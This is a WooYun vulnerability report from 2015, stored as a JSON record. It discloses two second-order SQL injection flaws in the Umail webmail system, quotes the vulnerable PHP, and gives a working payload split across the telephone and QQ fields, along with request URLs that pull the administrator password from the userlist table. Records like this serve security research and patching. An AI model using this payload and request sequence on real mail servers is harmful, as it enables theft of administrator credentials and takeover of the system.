{"id": 34203, "wybug_id": "wooyun-2015-098495", "wybug_title": "Umail最新版2处二次注入(直接出管理员密码)", "wybug_corp": "Umail", "wybug_author": "玉林嘎", "wybug_date": "2015-02-27 09:03", "wybug_open_date": "2015-06-02 08:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向公众公开  简要描述： 跟之前的不一样噢 详细说明：  umail最新版本\n\nwin2003标准安装2个二次注入都是因为同一个问题造成1、漏洞文件:/fast/pab/module/o_contact.php364-388行\nif ( ACTION == \"add-search-contact\" ){\t\t\t\t$grp = $_POST['grp'];\t\t\t\t$type = $_POST['stype'];\t\t\t\t$userids = $_POST['userids'];\t\t\t\t$user_arr = explode( \",\", $userids );\t\t\t\t$group_list = explode( \",\", $grp );\t\t\t\tif ( $type == \"oab\" || $type == \"oabshare\" )\t\t\t\t{\t\t\t\t\t\t\t\tif ( $user_arr )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tforeach ( $user_arr as $userid )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$user_info = $Mailbox->getUserInfoByID( $userid, \"*\", 0 );\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"fullname\" => $user_info['realname'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"birthday\" => $user_info['birthday'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $user_info['email'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"pref_tel\" => $user_info['mobil'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"im_qq\" => $user_info['qqmsn'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"im_msn\" => $user_info['qqmsn'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$contact_id = $PAB->add_contact( $data, 0 );\n重要代码\n$user_info = $Mailbox->getUserInfoByID( $userid, \"*\", 0 );\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"fullname\" => $user_info['realname'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"birthday\" => $user_info['birthday'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $user_info['email'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"pref_tel\" => $user_info['mobil'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"im_qq\" => $user_info['qqmsn'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"im_msn\" => $user_info['qqmsn'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$contact_id = $PAB->add_contact( $data, 0 );\nPOST进来的$userids 切割赋值给 $user_arr 进入2个if语句 遍历数组 进入getUserInfoByID()函数\npublic function getUserInfoByID( $_obfuscate_nQNptTJPg, $_obfuscate_tjILu7ZH = \"*\", $_obfuscate_ySeUHBw = FALSE )\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_nQNptTJPg = intval( $_obfuscate_nQNptTJPg );\t\t\t\t\t\t\t\t$_obfuscate_IRFhnYw = \"UserID='\".$_obfuscate_nQNptTJPg.\"'\";\t\t\t\t\t\t\t\t$_obfuscate_6RYLWQ = $this->getone_info( $_obfuscate_IRFhnYw, $_obfuscate_tjILu7ZH, $_obfuscate_ySeUHBw );\t\t\t\t\t\t\t\treturn $_obfuscate_6RYLWQ;\t\t\t\t}\n查询出赋值给user_info数组 带入 add_contact这个跟 WooYun: U-Mail邮件系统二次注入2（无需登录，可批量直接获取管理员密码）   getMailboxInfo()这个函数很不一样  这个对应的表是 mailuserinfo 里面的字段username 是不可改变的为初始设置的名字先看下 操作语句\n\n\n307 Query\tINSERT INTO pab_contact SET `user_id`='',`fullname`='王卫军',`birthday`='0000-00-00',`pref_email`='test@domain.com',`pref_tel`='',`im_qq`='',`im_msn`='',`updated`='2015-02-27 00:23:46'\n可以控制的有 pref_tel  im_qq im_msn 但其实 im_qq 和 im_msn 值一样的 所以只要 pref_tel im_qq 2个可控\n\n每个变量都不足于出管理员数据 需要2个同时构造才行pref_tel  构造成 ',`im_qq`=(select/*im_qq     构造成 */password from userlist limit 1,1)#最后语句应该是\n270 Query\tINSERT INTO pab_contact SET `user_id`='3',`fullname`='王卫军',`birthday`='0000-00-00',`pref_email`='test@domain.com',`pref_tel`='',`im_qq`=(select/*',`im_qq`='*/password from userlist limit 1,1)#',`im_msn`='*/password from userlist limit 1,1)#',`updated`='2015-02-27 00:14:46'\n我真机智！   漏洞证明：  漏洞证明：此处可根据之前漏洞可无需登陆即可操作 此处为表达清楚直接登陆操作先访问 http://192.168.106.137/webmail/fast/index.php?module=operate&action=loginpost:mailbox=test@domain.com&link=?获取认证 登陆修改\n\n访问 http://192.168.106.137/webmail/client/oab/index.php?module=operate&action=member-get&page=1&orderby=&is_reverse=1&keyword=test得到userid(此处为3)在访问 http://192.168.106.137/webmail/fast/pab/index.php?module=operate&action=add-search-contact post:stype=oab&userids=3 (3为上面操作得到的userid)\n\n最后查看 \n\n\n\n成功获取管理密码2、\\client\\pab\\module\\o_contact.php\nif ( ACTION == \"add-search-contact\" ){\t\t\t\t$grp = $_POST['grp'];\t\t\t\t$type = $_POST['stype'];\t\t\t\t$userids = id_list_filter( $_POST['userids'] );\t\t\t\t$user_arr = explode( \",\", $userids );\t\t\t\t$group_list = explode( \",\", $grp );\t\t\t\tif ( $type == \"oab\" || $type == \"oabshare\" )\t\t\t\t{\t\t\t\t\t\t\t\tif ( $user_arr )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tforeach ( $user_arr as $userid )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$user_info = $Mailbox->getUserInfoByID( ( integer )$userid, \"*\", 0 );\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"fullname\" => $user_info['realname'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"birthday\" => $user_info['birthday'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $user_info['email'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"pref_tel\" => $user_info['mobil'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"im_qq\" => $user_info['qqmsn'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"im_msn\" => $user_info['qqmsn'],\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$contact_id = $PAB->add_contact( $data, 0 );\n同样的问题 需登陆 此处不证明了吧   修复方案：  你们自己想办法咯   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-03-04 08:28 厂商回复： CNVD未在实例上复现,作为本地实例确认,已经按以往渠道向软件生产厂商通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-27 10:06 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  膜拜大牛  溜溜    \n     2015-06-02 11:09 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  好多钱钱，分析也很赞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}